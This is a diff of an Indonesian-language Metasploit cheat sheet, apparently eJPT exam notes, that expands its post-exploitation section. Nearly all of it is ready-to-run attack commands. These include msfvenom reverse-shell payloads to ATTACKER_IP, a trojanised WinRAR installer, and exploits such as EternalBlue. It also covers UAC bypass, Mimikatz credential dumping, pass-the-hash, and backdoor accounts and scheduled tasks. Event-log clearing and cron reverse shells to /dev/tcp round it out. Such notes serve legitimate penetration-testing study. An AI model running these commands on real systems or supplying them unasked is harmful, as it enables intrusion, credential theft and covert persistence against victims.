@@ -14,7 +14,10 @@
 5. [Vulnerability Scanning](#5-vulnerability-scanning)
 6. [Client-Side Attacks](#6-client-side-attacks)
 7. [Exploitation](#7-exploitation)
-8. [Post-Exploitation & Meterpreter](#8-post-exploitation--meterpreter)
+8. [Post-Exploitation](#8-post-exploitation)
+   - [Post Exploitation Fundamentals](#81-post-exploitation-fundamentals)
+   - [Windows Post Exploitation](#82-windows-post-exploitation)
+   - [Linux Post Exploitation](#83-linux-post-exploitation)
 9. [Payloads & Msfvenom](#9-payloads--msfvenom)
 10. [Armitage](#10-armitage)
 
@@ -109,8 +112,8 @@ Staged
   → lebih powerful
 
 Cara beda Single vs Staged di nama:
-  windows/shell_reverse_tcp      → single (underscore setelah shell)
-  windows/shell/reverse_tcp      → staged (slash setelah shell)
+  windows/shell_reverse_tcp       → single (underscore setelah shell)
+  windows/shell/reverse_tcp       → staged (slash setelah shell)
   windows/meterpreter_reverse_tcp → single meterpreter
   windows/meterpreter/reverse_tcp → staged meterpreter
 ```
@@ -301,33 +304,18 @@ db_nmap -sV -sC -O TARGET_IP
 # ─── FTP ──────────────────────────────────────────────────
 
 use auxiliary/scanner/ftp/ftp_version
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/ftp/anonymous
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/ftp/ftp_login
 set RHOSTS TARGET_IP
-set USER_FILE path/to/file.txt
-set PASS_FILE path/to/file.txt
+set USER_FILE /path/to/users.txt
+set PASS_FILE /path/to/passwords.txt
 run
 
 # ─── SMB ──────────────────────────────────────────────────
 
 use auxiliary/scanner/smb/smb_version
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/smb/smb_enumshares
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/smb/smb_enumusers
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/smb/smb_ms17_010
 set RHOSTS TARGET_IP
 run
@@ -335,9 +323,6 @@ run
 # ─── SSH ──────────────────────────────────────────────────
 
 use auxiliary/scanner/ssh/ssh_version
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/ssh/ssh_enumusers
 set RHOSTS TARGET_IP
 set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
@@ -346,18 +331,8 @@ run
 # ─── HTTP ─────────────────────────────────────────────────
 
 use auxiliary/scanner/http/http_version
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/http/http_header
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/http/dir_scanner
-set RHOSTS TARGET_IP
-set DICTIONARY /usr/share/wordlists/dirb/common.txt
-run
-
 use auxiliary/scanner/http/robots_txt
 set RHOSTS TARGET_IP
 run
@@ -365,20 +340,14 @@ run
 # ─── SMTP ─────────────────────────────────────────────────
 
 use auxiliary/scanner/smtp/smtp_version
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/smtp/smtp_enum
 set RHOSTS TARGET_IP
-set USER_FILE path/to/file.txt
+set USER_FILE /path/to/users.txt
 run
 
 # ─── MYSQL ────────────────────────────────────────────────
 
 use auxiliary/scanner/mysql/mysql_version
-set RHOSTS TARGET_IP
-run
-
 use auxiliary/scanner/mysql/mysql_login
 set RHOSTS TARGET_IP
 set USERNAME root
@@ -402,13 +371,6 @@ run
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS TARGET_IP
 run
-
-# Plugin Metasploit Autopwn
-https://github.com/hahwul/metasploit-autopwn
-
-move: /usr/share/metasploit-framework/plugins/
-load: load db_autopwn
-
 ```
 
 ### Integrasi dengan Nmap & Nessus
@@ -431,21 +393,16 @@ vulns
 ```bash
 # 1. Setup workspace
 workspace -a Web_scanning
-setg <IP TARGET>
 
 # 2. Load Wmap
 load wmap
 
-# 3. Atur Ip target
-wmap_sites -a <IP TARGET>
+# 3. Atur target
+wmap_sites -a <IP_TARGET>
+wmap_target -t http://<TARGET>/
 
-# 4. Atur URL target
-wmap_target -t http://<TARGET>/xxx
-services
-
-# 5. Running
+# 4. Running
 wmap_run -t
-
 ```
 
 ---
@@ -459,61 +416,65 @@ Client-side attacks menargetkan **aplikasi di sisi client** (browser, Office, PD
 ### Generating Payloads With Msfvenom
 
 ```bash
-# ─── WINDOWS EXECUTABLE ────────────────────────────────────
+# Windows x64
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx64.exe
 
-# Basic reverse shell .exe
-msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx64.exe
-msfvenom -a x86 -p windows/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx86.exe
+# Windows x86
+msfvenom -a x86 -p windows/x86/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx86.exe
 
-# ─── LINUX EXECUTABLE ──────────────────────────────────────
+# Linux x64
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx64
 
-# Basic reverse shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx86
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx64
+# Linux x86
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx86
 ```
 
 ### Encoding Payloads with Msfvenom
 
 ```bash
-# List Encoding
+# List encoder
 msfvenom --list encoders
 
-# Mengunakan encoder shikata_ga_nai dengan iterasi 10
+# Encode dengan shikata_ga_nai (iterasi 10)
+# Windows
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 \
+  -i 10 -e x86/shikata_ga_nai -f exe > encodingx86.exe
 
-Iterasi memungkinkan untuk tidak terdeteksi antivirus
-
-# ─── WINDOWS EXECUTABLE ────────────────────────────────────
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe > encodingx86.exe
-
-# ─── LINUX EXECUTABLE ────────────────────────────────────
-
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10 -e x86/shikata_ga_nai -f elf > encodingx86
+# Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 \
+  -i 10 -e x86/shikata_ga_nai -f elf > encodingx86
 ```
 
 ### Injecting Payloads Into Windows Portable Executables
 
 ```bash
-# ─── WINDOWS EXECUTABLE ────────────────────────────────────
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10 -x ~/Downloads/wrar602.exe -e x86/shikata_ga_nai -f exe > winrar.exe
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=ATTACKER_IP LPORT=4444 \
+  -i 10 -x ~/Downloads/wrar602.exe \
+  -e x86/shikata_ga_nai -f exe > winrar.exe
 ```
 
 ### Automating Metasploit With Resource Scripts
 
 ```bash
-Buat file terlebih dahulu dan simpan
+# Buat file handler.rc
 nano handler.rc
 
-use multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST ATTACKER_IP
-set LPORT 4444
-run
+# Isi file:
+# use multi/handler
+# set payload windows/meterpreter/reverse_tcp
+# set LHOST ATTACKER_IP
+# set LPORT 4444
+# run
 
-Jalankan
+# Jalankan
 msfconsole -r handler.rc
-
 ```
 
 ---
@@ -532,43 +493,17 @@ msfconsole -r handler.rc
 7. Interact dengan sesi yang didapat
 ```
 
-### Mencari & Memilih Exploit
-
-```bash
-# Cari berdasarkan service/CVE
-search ms17-010
-search eternalblue
-search type:exploit platform:windows smb rank:excellent
-
-# Lihat rank exploit:
-# excellent > great > good > normal > average > low > manual
-
-# Pilih exploit
-use exploit/windows/smb/ms17_010_eternalblue
-
-# Cek info lengkap
-info
-
-# Lihat target yang didukung
-show targets
-
-# Cek apakah target vulnerable (tidak semua exploit support ini)
-check
-```
-
-### Exploiting A Vulnerable HTTP File Server
-
 ### Exploit Windows
 
 ```bash
-# ─── HTTP File Server Rejetto ──────────
+# ─── HTTP File Server Rejetto ──────────────────────────────
 
 use exploit/windows/http/rejetto_hfs_exec
 set RHOSTS TARGET_IP
 set LHOST ATTACKER_IP
 run
 
-# ─── MS17-010 ETERNALBLUE (Windows 7/Server 2008) ──────────
+# ─── MS17-010 EternalBlue (Windows 7/Server 2008) ──────────
 
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS TARGET_IP
@@ -576,7 +511,7 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST ATTACKER_IP
 run
 
-# ─── WinRM ─────────────────────
+# ─── WinRM ─────────────────────────────────────────────────
 
 use auxiliary/scanner/winrm/winrm_login
 set RHOSTS TARGET_IP
@@ -585,11 +520,11 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 run
 
 use exploit/windows/winrm/winrm_script_exec
-set USERNAME [Username_Valid]
-set PASSWORD [Password_Valid]
+set USERNAME <user_valid>
+set PASSWORD <pass_valid>
 run
 
-# ─── TOMCAT (default credentials) ──────────────────────────
+# ─── Tomcat ────────────────────────────────────────────────
 
 use auxiliary/scanner/http/tomcat_mgr_login
 set RHOSTS TARGET_IP
@@ -607,33 +542,32 @@ run
 ### Exploit Linux
 
 ```bash
-
-# ─── VSFTPD 2.3.4 BACKDOOR ─────────────────────────────────
+# ─── VSFTPD 2.3.4 Backdoor ─────────────────────────────────
 
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS TARGET_IP
 run
 
-# ─── SAMBA ────────────────────────────────
+# ─── Samba ─────────────────────────────────────────────────
 
 use exploit/linux/samba/is_known_pipename
 set RHOSTS TARGET_IP
 run
 
-Upgare to meterpreter:
+# Upgrade ke Meterpreter
 use post/multi/manage/shell_to_meterpreter
 
-# ─── SSH ────────────────────────────────────────
+# ─── SSH ───────────────────────────────────────────────────
 
 use auxiliary/scanner/ssh/libssh_auth_bypass
 set RHOSTS TARGET_IP
 set SPAWN_PTY true
 run
 
-# ─── SMTP Server ─────────────────────────
+# ─── SMTP Haraka ───────────────────────────────────────────
 
 use exploit/linux/smtp/haraka
-set rhost TARGET_IP
+set RHOST TARGET_IP
 set SRVPORT 9898
 set email_to root@attackdefense.test
 set PAYLOAD linux/x64/meterpreter_reverse_tcp
@@ -643,13 +577,17 @@ run
 
 ---
 
-## 8. Post-Exploitation & Meterpreter
+## 8. Post-Exploitation
 
-### Meterpreter Overview
+---
 
-Meterpreter adalah payload advanced yang berjalan **di memory** (tidak menulis ke disk), menggunakan **encrypted communication**, dan sangat sulit dideteksi AV. Fitur jauh lebih lengkap dari shell biasa.
+### 8.1 Post Exploitation Fundamentals
 
-### Perintah Dasar Meterpreter
+---
+
+#### Meterpreter Fundamentals
+
+Meterpreter adalah payload advanced yang berjalan **di memory** (tidak menulis ke disk), menggunakan **encrypted communication**, dan sangat sulit dideteksi AV.
 
 ```bash
 # ─── SYSTEM INFO ─────────────────────────────────────────
@@ -666,83 +604,18 @@ ls                      # list file
 cd /tmp
 ls
 cat /etc/passwd
-download /etc/passwd /tmp/passwd_local    # download file
-upload /tmp/tool.exe C:\\Windows\\Temp\\  # upload file
-edit /tmp/file.txt                        # edit file
+download /etc/passwd /tmp/passwd_local
+upload /tmp/tool.exe C:\\Windows\\Temp\\
+edit /tmp/file.txt
 mkdir /tmp/newdir
 rm /tmp/file.txt
-search -f "*.txt"                         # cari file
-search -f "password*" -d C:\\Users\\      # cari di direktori
+search -f "*.txt"
+search -f "password*" -d C:\\Users\\
 
 # ─── SHELL ───────────────────────────────────────────────
 
 shell                   # akses shell OS biasa
-# Keluar dari shell kembali ke meterpreter:
-# Ctrl+Z atau exit
-
-# ─── PRIVILEGE ESCALATION ────────────────────────────────
-
-getuid                  # cek user saat ini
-getsystem               # coba otomatis escalate ke SYSTEM
-# Metode: getsystem mencoba beberapa teknik sekaligus
-
-# Manual privilege escalation
-use post/multi/recon/local_exploit_suggester
-set SESSION 1
-run
-# Lihat exploit lokal yang mungkin berhasil, lalu gunakan
-
-# ─── PERSISTENCE ─────────────────────────────────────────
-
-# Buat user baru (Windows)
-execute -f cmd.exe -a "/c net user hacker Password123! /add"
-execute -f cmd.exe -a "/c net localgroup administrators hacker /add"
-
-# Persistence via registry (Windows)
-run post/windows/manage/persistence_exe STARTUP=REGISTRY
-
-# ─── CREDENTIAL HARVESTING ───────────────────────────────
-
-# Dump password hash (butuh SYSTEM atau admin)
-hashdump
-
-# Dump semua credentials dengan mimikatz
-load kiwi                # load kiwi (mimikatz)
-creds_all               # dump semua credentials
-lsa_dump_sam            # dump SAM database
-lsa_dump_secrets        # dump LSA secrets
-wifi_list               # dump WiFi passwords
-
-# ─── NETWORK ─────────────────────────────────────────────
-
-ipconfig                # network interfaces
-arp                     # ARP table
-netstat                 # koneksi aktif
-route                   # routing table
-
-portfwd add -l 8080 -p 80 -r INTERNAL_HOST   # port forward
-portfwd list
-portfwd delete -l 8080
-
-# ─── PIVOTING ────────────────────────────────────────────
-
-run post/multi/manage/autoroute SUBNET=192.168.2.0/24
-# atau
-run autoroute -s 192.168.2.0/24
-run autoroute -p             # lihat routes yang ditambahkan
-
-# ─── SCREENSHOT & KEYLOGGER ──────────────────────────────
-
-screenshot              # ambil screenshot desktop
-keyscan_start           # mulai keylogger
-keyscan_dump            # dump hasil keylogger
-keyscan_stop            # hentikan keylogger
-
-# ─── WEBCAM & MICROPHONE ─────────────────────────────────
-
-webcam_list             # list webcam
-webcam_snap             # ambil foto dari webcam
-record_mic -d 10        # rekam mic 10 detik
+# Keluar dari shell kembali ke meterpreter: Ctrl+Z atau exit
 
 # ─── BACKGROUND / MANAGE SESSIONS ────────────────────────
 
@@ -750,32 +623,559 @@ background              # background session (Ctrl+Z)
 sessions -l             # list sessions
 sessions -i 1           # kembali ke session 1
 sessions -u 1           # upgrade shell ke meterpreter
+
+# ─── NETWORK ─────────────────────────────────────────────
+
+ipconfig / ifconfig     # network interfaces
+arp                     # ARP table
+netstat                 # koneksi aktif
+route                   # routing table
 ```
 
-### Post-Exploitation Modules
+---
+
+#### Upgrading Command Shells To Meterpreter Shells
+
+Ketika exploit hanya menghasilkan shell biasa (bukan Meterpreter), shell tersebut bisa di-upgrade.
 
 ```bash
-# Recon setelah dapat akses
-use post/multi/recon/local_exploit_suggester
-set SESSION 1
+# Cara 1 — Dari msfconsole (paling mudah)
+sessions -u <session_id>
+# MSF otomatis upgrade shell biasa ke Meterpreter
+
+# Cara 2 — Post module
+use post/multi/manage/shell_to_meterpreter
+set SESSION <session_id>
 run
 
-# Gather system info
+# Cara 3 — Dari dalam shell biasa
+# Generate payload Meterpreter baru dengan msfvenom
+# Upload dan eksekusi di target
+# Tangkap dengan multi/handler
+
+# Verifikasi setelah upgrade
+sessions -l
+# Meterpreter type akan berubah dari 'shell' ke 'meterpreter'
+```
+
+**Kenapa perlu upgrade?**
+
+| Shell Biasa | Meterpreter |
+|---|---|
+| Fitur terbatas | Fitur lengkap |
+| Tidak encrypted | Encrypted |
+| Mudah terdeteksi | Sulit terdeteksi |
+| Tidak stabil | Lebih stabil |
+| Tidak bisa pivoting | Bisa pivoting, port forward |
+
+---
+
+### 8.2 Windows Post Exploitation
+
+---
+
+#### Windows Post Exploitation Modules
+
+```bash
+# Enumerasi sistem
 use post/windows/gather/enum_system
-use post/linux/gather/enum_system
+set SESSION <id>
+run
 
-# Dump credentials
-use post/windows/gather/hashdump
-use post/windows/gather/credentials/credential_collector
-
-# Enumerate installed software (Windows)
+# Enumerate installed software
 use post/windows/gather/enum_applications
+set SESSION <id>
+run
+
+# Enumerate logged on users
+use post/windows/gather/enum_logged_on_users
+set SESSION <id>
+run
+
+# Collect credentials
+use post/windows/gather/credentials/credential_collector
+set SESSION <id>
+run
+
+# Local exploit suggester — cari celah PrivEsc
+use post/multi/recon/local_exploit_suggester
+set SESSION <id>
+run
 
 # Network enumeration dari dalam target
 use post/multi/gather/ping_sweep
 set RHOSTS 192.168.2.0/24
-set SESSION 1
+set SESSION <id>
 run
+```
+
+---
+
+#### Windows Privilege Escalation: Bypassing UAC
+
+UAC (User Account Control) membatasi akses meskipun user adalah Administrator. UAC Bypass diperlukan untuk naik dari **Medium Integrity** ke **High Integrity**.
+
+```bash
+# Syarat: sudah dapat Meterpreter sebagai user Administrator
+# Pastikan arsitektur x64 (migrate ke explorer dulu)
+
+# 1. Cek posisi saat ini
+meterpreter > getuid
+meterpreter > sysinfo
+
+# 2. Migrate ke explorer.exe (x64 + token sesi user)
+meterpreter > pgrep explorer
+meterpreter > migrate <PID>
+
+# 3. Background sesi
+meterpreter > background
+
+# 4. Load UAC bypass module
+use exploit/windows/local/bypassuac_eventvwr   # Win 7/2008/2012
+# atau
+use exploit/windows/local/bypassuac_fodhelper  # Win 10
+
+# 5. Set session dan payload
+set SESSION <id>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <IP_KALI>
+run
+
+# 6. Di sesi baru — eskalasi ke SYSTEM
+meterpreter > getsystem
+meterpreter > getuid
+# NT AUTHORITY\SYSTEM ✓
+```
+
+**UACMe (manual method):**
+
+```bash
+# Generate payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=<IP> LPORT=4444 -f exe -o backdoor.exe
+
+# Upload Akagi64.exe + backdoor.exe
+meterpreter > upload Akagi64.exe C:\\Users\\admin\\AppData\\Local\\Temp
+meterpreter > upload backdoor.exe C:\\Users\\admin\\AppData\\Local\\Temp
+
+# Jalankan UACMe
+meterpreter > shell
+C:\> C:\Users\admin\AppData\Local\Temp\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+
+# Nomor metode UACMe:
+# 23 → eventvwr.exe  (Win 7/2008/2012) ← paling sering di eJPT
+# 30 → fodhelper.exe (Win 10)
+# 33 → diskcleanup   (Win 10)
+```
+
+---
+
+#### Windows Privilege Escalation: Token Impersonation With Incognito
+
+Token Impersonation memanfaatkan `SeImpersonatePrivilege` untuk mencuri token milik proses SYSTEM.
+
+```bash
+# Syarat: cek privilege dulu
+meterpreter > getprivs
+# Harus ada: SeImpersonatePrivilege
+
+# 1. Load modul incognito
+meterpreter > load incognito
+
+# 2. List token yang tersedia
+meterpreter > list_tokens -u
+
+# 3. Impersonate token SYSTEM
+meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
+
+# 4. Verifikasi
+meterpreter > getuid
+# NT AUTHORITY\SYSTEM ✓
+
+# 5. Kalau privilege masih terbatas
+meterpreter > getsystem
+```
+
+**Potato Attacks** (jika `SeImpersonatePrivilege` tersedia):
+
+| Tool | Target OS |
+|---|---|
+| JuicyPotato | Windows 7–10 / 2008–2016 |
+| PrintSpoofer | Windows 10 / 2019 |
+| RoguePotato | Windows 10 / 2019 |
+
+```bash
+# JuicyPotato manual
+meterpreter > upload JuicyPotato.exe C:\\Temp
+meterpreter > upload backdoor.exe C:\\Temp
+C:\Temp> JuicyPotato.exe -l 4445 -p backdoor.exe -t * -c <CLSID>
+```
+
+---
+
+#### Dumping Hashes With Mimikatz
+
+```bash
+# Syarat: NT AUTHORITY\SYSTEM
+meterpreter > getsystem
+meterpreter > getuid
+
+# Load Kiwi (Mimikatz)
+meterpreter > load kiwi
+
+# Dump semua credentials
+meterpreter > creds_all
+
+# Dump dari SAM
+meterpreter > lsa_dump_sam
+
+# Dump LSA secrets
+meterpreter > lsa_dump_secrets
+
+# Kalau creds_all kosong → migrate ke lsass dulu
+meterpreter > pgrep lsass
+meterpreter > migrate <PID>
+meterpreter > creds_all
+```
+
+**Contoh output:**
+
+```
+Username      : Administrator
+Domain        : ATTACKDEFENSE
+NTLM          : e3c61a68f1b89ee6c8ba9507378dc88d
+SHA1          : fa62275e30d286c09d30d8fece82664eb34323ef
+Password      : (null)
+```
+
+---
+
+#### Pass-the-Hash With PSExec
+
+Menggunakan NTLM hash langsung untuk autentikasi tanpa perlu password plaintext.
+
+```bash
+# Cara 1 — PSExec Impacket
+python3 /usr/share/doc/python3-impacket/examples/psexec.py \
+  -hashes aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d \
+  Administrator@<IP>
+
+# Shortcut kalau LM kosong
+python3 psexec.py -hashes :e3c61a68f1b89ee6c8ba9507378dc88d Administrator@<IP>
+
+# Cara 2 — Metasploit PSExec
+use exploit/windows/smb/psexec
+set RHOSTS <IP>
+set SMBUser Administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+# Cara 3 — CrackMapExec
+crackmapexec smb <IP> -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d
+crackmapexec smb <IP> -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "whoami"
+```
+
+---
+
+#### Establishing Persistence On Windows
+
+Persistence memastikan akses tetap ada meskipun sistem di-restart atau sesi terputus.
+
+```bash
+# Cara 1 — Persistence via registry (Metasploit module)
+use post/windows/manage/persistence_exe
+set SESSION <id>
+set STARTUP REGISTRY        # atau SCHEDULER / SERVICE
+set PAYLOAD_FILE backdoor.exe
+run
+
+# Cara 2 — Buat user baru (manual)
+meterpreter > shell
+C:\> net user hacker Password123! /add
+C:\> net localgroup administrators hacker /add
+
+# Cara 3 — Scheduled task
+C:\> schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\backdoor.exe" /sc onstart /ru SYSTEM
+
+# Cara 4 — Registry Run key
+C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
+     /v WindowsUpdate /t REG_SZ /d "C:\Temp\backdoor.exe"
+```
+
+---
+
+#### Enabling RDP
+
+RDP (Remote Desktop Protocol) memungkinkan akses GUI ke sistem Windows.
+
+```bash
+# Cara 1 — Metasploit module
+use post/windows/manage/enable_rdp
+set SESSION <id>
+run
+
+# Cara 2 — Manual dari shell
+meterpreter > shell
+
+# Enable RDP
+C:\> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" \
+     /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Allow di firewall
+C:\> netsh advfirewall firewall add rule name="RDP" \
+     protocol=TCP dir=in localport=3389 action=allow
+
+# Tambah user untuk RDP
+C:\> net localgroup "Remote Desktop Users" hacker /add
+
+# Koneksi dari Kali
+xfreerdp /u:Administrator /p:Password123 /v:<IP_TARGET>
+xfreerdp /u:hacker /p:Password123! /v:<IP_TARGET>
+```
+
+---
+
+#### Windows Keylogging
+
+```bash
+# Mulai keylogger
+meterpreter > keyscan_start
+
+# Dump hasil keylogger
+meterpreter > keyscan_dump
+
+# Hentikan keylogger
+meterpreter > keyscan_stop
+
+# Screenshot desktop
+meterpreter > screenshot
+
+# Webcam
+meterpreter > webcam_list
+meterpreter > webcam_snap
+
+# Rekam microphone (10 detik)
+meterpreter > record_mic -d 10
+```
+
+---
+
+#### Clearing Windows Event Logs
+
+Menghapus log untuk menghilangkan jejak aktivitas.
+
+```bash
+# Cara 1 — Meterpreter built-in
+meterpreter > clearev
+
+# Cara 2 — Manual dari shell
+meterpreter > shell
+
+# Hapus semua event log
+C:\> wevtutil cl System
+C:\> wevtutil cl Security
+C:\> wevtutil cl Application
+
+# List semua log yang tersedia
+C:\> wevtutil el
+
+# Cara 3 — PowerShell
+C:\> powershell -c "Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }"
+```
+
+> ⚠️ **Catatan**: Di exam eJPT, clearing logs biasanya tidak diperlukan. Di real engagement, selalu sesuaikan dengan scope yang disepakati.
+
+---
+
+#### Pivoting
+
+Pivoting memungkinkan akses ke jaringan internal yang tidak dapat diakses langsung dari Kali.
+
+```bash
+# Syarat: sudah dapat Meterpreter di mesin yang terhubung ke dua jaringan
+
+# 1. Cek interface jaringan di target
+meterpreter > ipconfig
+# Temukan subnet internal: misal 192.168.2.0/24
+
+# 2. Tambahkan route ke subnet internal
+meterpreter > run post/multi/manage/autoroute SUBNET=192.168.2.0/24
+# atau
+meterpreter > run autoroute -s 192.168.2.0/24
+meterpreter > run autoroute -p    # verifikasi route
+
+# 3. Background sesi
+meterpreter > background
+
+# 4. Scan subnet internal via route
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.2.0/24
+set PORTS 22,80,445,3389
+run
+
+# 5. Setup SOCKS proxy untuk tools lain (Proxychains)
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 5
+run -j
+
+# Edit /etc/proxychains4.conf
+# socks5 127.0.0.1 9050
+
+# Gunakan tools via proxychains
+proxychains nmap -sT -Pn 192.168.2.10
+proxychains psexec.py Administrator@192.168.2.10
+
+# 6. Port Forwarding
+meterpreter > portfwd add -l 8080 -p 80 -r 192.168.2.10
+# Akses 192.168.2.10:80 via localhost:8080
+meterpreter > portfwd list
+meterpreter > portfwd delete -l 8080
+```
+
+---
+
+### 8.3 Linux Post Exploitation
+
+---
+
+#### Linux Post Exploitation Modules
+
+```bash
+# Enumerasi sistem
+use post/linux/gather/enum_system
+set SESSION <id>
+run
+
+# Enumerate network
+use post/linux/gather/enum_network
+set SESSION <id>
+run
+
+# Enumerate user history
+use post/linux/gather/enum_users_history
+set SESSION <id>
+run
+
+# Gather configs
+use post/linux/gather/enum_configs
+set SESSION <id>
+run
+
+# Local exploit suggester
+use post/multi/recon/local_exploit_suggester
+set SESSION <id>
+run
+
+# Network ping sweep dari target
+use post/multi/gather/ping_sweep
+set RHOSTS 10.10.10.0/24
+set SESSION <id>
+run
+```
+
+---
+
+#### Linux Privilege Escalation: Exploiting A Vulnerable Program
+
+```bash
+# 1. Cek SUID binaries
+meterpreter > shell
+$ find / -perm -u=s -type f 2>/dev/null
+
+# 2. Cek sudo permissions
+$ sudo -l
+
+# 3. Cek cronjobs
+$ cat /etc/crontab
+$ ls -la /etc/cron.*
+
+# 4. Local exploit suggester
+use post/multi/recon/local_exploit_suggester
+set SESSION <id>
+run
+
+# Eksploitasi SUID binary
+# Referensi: https://gtfobins.github.io
+
+# Contoh: bash dengan SUID
+$ bash -p
+# bash-5.0# (root!)
+
+# Contoh: find dengan SUID
+$ find . -exec /bin/bash -p \; -quit
+
+# Contoh: vim dengan SUID
+$ vim -c ':!/bin/bash -p'
+
+# Cronjob exploitation
+# Cek file yang dieksekusi cronjob
+$ ls -la /path/to/cronjob_script.sh
+# Kalau writable:
+$ echo "bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1" >> /path/to/cronjob_script.sh
+# Setup listener di Kali: nc -lvnp 4444
+# Tunggu cronjob jalan → dapat root shell
+```
+
+---
+
+#### Dumping Hashes With Hashdump
+
+```bash
+# Cara 1 — Meterpreter hashdump (butuh root)
+meterpreter > hashdump
+
+# Cara 2 — Post module
+use post/linux/gather/hashdump
+set SESSION <id>
+run
+
+# Cara 3 — Manual dari shell (butuh root)
+$ cat /etc/shadow
+
+# Format shadow file:
+# username:$type$salt$hash:lastchange:min:max:warn:inactive:expire
+# $1$ = MD5
+# $6$ = SHA-512 ← paling umum di Linux modern
+
+# Crack hash Linux dengan John
+$ unshadow /etc/passwd /etc/shadow > hashes.txt
+$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Crack dengan hashcat
+$ hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512
+$ hashcat -m 500  hashes.txt /usr/share/wordlists/rockyou.txt  # MD5
+```
+
+---
+
+#### Establishing Persistence On Linux
+
+```bash
+# Cara 1 — Post module (paling mudah)
+use post/linux/manage/sshkey_persistence
+set SESSION <id>
+run
+# Membuat SSH key dan menambahkan ke authorized_keys
+
+# Cara 2 — Tambah user baru (manual)
+meterpreter > shell
+$ useradd -m -s /bin/bash hacker
+$ echo "hacker:Password123" | chpasswd
+$ usermod -aG sudo hacker      # Debian/Ubuntu
+$ usermod -aG wheel hacker     # CentOS/RHEL
+
+# Cara 3 — SSH backdoor (pasang public key)
+$ mkdir -p /root/.ssh
+$ echo "<PUBLIC_KEY>" >> /root/.ssh/authorized_keys
+$ chmod 600 /root/.ssh/authorized_keys
+
+# Koneksi dari Kali:
+$ ssh -i id_rsa root@<IP_TARGET>
+
+# Cara 4 — Cron persistence
+$ (crontab -l; echo "* * * * * bash -i >& /dev/tcp/<IP>/4444 0>&1") | crontab -
 ```
 
 ---
@@ -804,134 +1204,70 @@ msfvenom -p <PAYLOAD> [OPTIONS] -f <FORMAT> -o <OUTPUT_FILE>
 # LHOST, LPORT : untuk reverse payload
 ```
 
-### List Payload & Format
-
-```bash
-# List semua payload
-msfvenom -l payloads
-
-# List payload untuk platform tertentu
-msfvenom -l payloads | grep windows
-msfvenom -l payloads | grep linux
-msfvenom -l payloads | grep android
-
-# List format output
-msfvenom -l formats
-
-# List encoder
-msfvenom -l encoders
-```
-
 ### Generate Payload per Platform
 
 ```bash
 # ─── WINDOWS ───────────────────────────────────────────────
 
-# .exe reverse meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f exe -o win_payload.exe
+  LHOST=ATTACKER_IP LPORT=4444 -f exe -o win_payload.exe
 
-# .exe 64-bit
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f exe -o win64_payload.exe
+  LHOST=ATTACKER_IP LPORT=4444 -f exe -o win64_payload.exe
 
 # DLL
